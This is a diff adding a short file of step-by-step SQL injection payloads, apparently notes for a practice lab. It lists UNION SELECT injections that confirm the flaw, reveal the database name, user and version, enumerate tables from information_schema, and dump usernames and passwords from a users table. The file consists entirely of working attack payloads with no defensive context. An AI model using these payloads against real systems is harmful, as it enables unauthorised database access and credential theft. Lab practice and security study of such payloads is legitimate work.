@@ -1,0 +1,14 @@
+1) Test whether vulnerable 
+1=1
+
+2) Get database info
+1' or 1=1 union select database(), user()#
+
+3) Get the version
+1' or 1=1 union select null, version()#
+
+4) List tables
+1'or 1=1 union select null, table_name from information_schema.tables#
+
+5) Get user data
+1'or 1=1 union select user, password from users#
